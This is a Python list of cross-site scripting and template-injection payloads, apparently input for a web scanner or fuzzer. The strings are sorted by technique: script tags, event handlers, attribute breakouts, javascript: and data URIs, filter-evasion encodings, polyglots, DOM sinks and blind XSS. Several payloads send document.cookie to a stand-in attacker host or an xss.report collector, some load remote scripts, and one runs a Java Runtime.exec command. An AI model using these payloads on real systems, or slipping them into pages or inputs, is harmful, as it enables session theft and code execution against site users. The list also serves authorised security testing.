PAYLOADS = [
    # === 1: Script injection ===
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>fetch('https://ev il.com/?c='+document.cookie)</script>",
    "<script>new Image().src='https://ev il.com/?c='+document.cookie</script>",
    "<script>document.location='https://ev il.com/?c='+document.cookie</script>",
    "<script src=https://ev il.com/xss.js></script>",
    "<script src=\"https://ev il.com/xss.js\"></script>",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>window['al'+'ert'](1)</script>",

    # === 2: Event handlers ===
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=fetch('https://ev il.com/?c='+document.cookie)>",
    "<img src=x onerror=eval('al'+'ert(1)')>",
    "<img src=x onerror=prompt(1)>",
    "<img src=x onerror=confirm(1)>",
    "<img src=x onerror=document.location='https://ev il.com/?c='+document.cookie>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')></svg>",
    "<svg onload=alert(document.cookie)></svg>",
    "<svg onload=fetch('https://ev il.com/?c='+document.cookie)></svg>",
    "<svg onload=eval('al'+'ert(1)')>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<body onload=fetch('https://ev il.com/?l='+location)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<div onpointerenter=alert(1)>hover</div>",
    "<div onmouseover=alert(1)>hover</div>",
    "<div onclick=alert(1)>click</div>",
    "<button onclick=alert(1)>Click</button>",
    "<button onfocus=alert(1) autofocus>Click</button>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<x onmouseover=alert(1)>Hover</x>",
    "<a onmouseover=alert(1)>hover</a>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<progress onprogress=alert(1)>",

    # === 3: Attribute breakout ===
    "\"><script>alert(1)</script>",
    "\"><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "\"><iframe src=javascript:alert(1)>",
    "\"><body onload=alert(1)>",
    "\"><input onfocus=alert(1) autofocus>",
    "\"><details open ontoggle=alert(1)>",
    "\" autofocus onfocus=alert(1) x=\"",
    "\" onfocus=alert(1) autofocus=\"",
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "' autofocus onfocus=alert(1) '",

    # === 4: Breakout contexts ===
    "</textarea><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</noscript><script>alert(1)</script>",
    "--><script>alert(1)</script>",

    # === 5: URI / javascript: ===
    "<a href=\"javascript:alert(1)\">Click</a>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
    "<form><button formaction=javascript:alert(1)>Click</form>",

    # === 6: Data URI ===
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",

    # === 7: Framework (Angular/Vue/React) ===
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "<div ng-app>{{$on.constructor('alert(1)')()}}</div>",
    "<input autofocus ng-focus=\"$event.view.alert(1)\">",

    # === 8: WAF bypass ===
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74(1)')</script>",
    "<a href=\"java\nscript:alert(1)\">Click</a>",
    "<a href=\"java\tscript:alert(1)\">Click</a>",

    # === 9: Polyglot ===
    "\"--></style></script><img src=x onerror=alert(1)>",
    "\"'><img src=x onerror=alert(1)>",
    "\"/><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1) <!--",
    "<img src=x onerror=\"alert(1)\" \"",
    "<img/src=x onerror=alert(1)>",

    # === 10: DOM sinks ===
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>eval(location.hash.slice(1))</script>",
    "<script>setTimeout('alert(1)',1)</script>",
    "<script>new Function('alert(1)')()</script>",
    "<script>location.href='javascript:alert(1)'</script>",

    # === 11: Blind XSS ===
    "<script src=https://xss.report/abc></script>",
    "<img src=x onerror=\"new Image().src='https://xss.report/abc?c='+document.cookie\">",
    "<script>fetch('https://xss.report/abc?c='+document.cookie)</script>",

    # === 12: Template injection ===
    "${7*7}",
    "{{7*7}}",
    "<%= 7*7 %>",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]
